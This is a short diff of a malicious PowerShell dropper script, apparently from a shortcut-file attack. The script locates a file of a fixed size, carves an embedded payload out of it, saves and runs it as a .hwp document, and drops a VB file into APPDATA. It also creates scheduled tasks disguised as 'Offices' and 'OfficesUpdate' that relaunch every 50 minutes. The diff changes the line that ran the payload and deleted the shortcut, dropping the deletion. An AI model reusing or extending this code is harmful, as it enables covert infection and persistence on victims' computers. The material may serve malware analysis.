@@ -2,7 +2,8 @@ $lk=ls -Path '.\' | Where {$_.length -eq 87629};
 if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 87629}};
 sc -path 'C:\Users\user\Downloads\1.txt' $lk
 if($lk -ne $null ){$oP=$lk.fullname.Replace('.lnk','.hwp');
-$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..87628];[System.IO.File]::WriteAllBytes($op,$file1);^&$op;ri $lk -force}
+$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..87628];
+[System.IO.File]::WriteAllBytes($op,$file1);&$op;}
 
 ######  VB File  #####
 $filepath = $env:APPDATA + "\settings.in"
@@ -43,6 +44,7 @@ schtasks /create /tn "Offices" /sc minute /st $st /tr $ws /mo 50 /F
 schtasks /create /tn "OfficesUpdate" /sc minute /st $st1 /tr $ws1 /mo 50 /F
 
 ipconfig
+
 
 
 
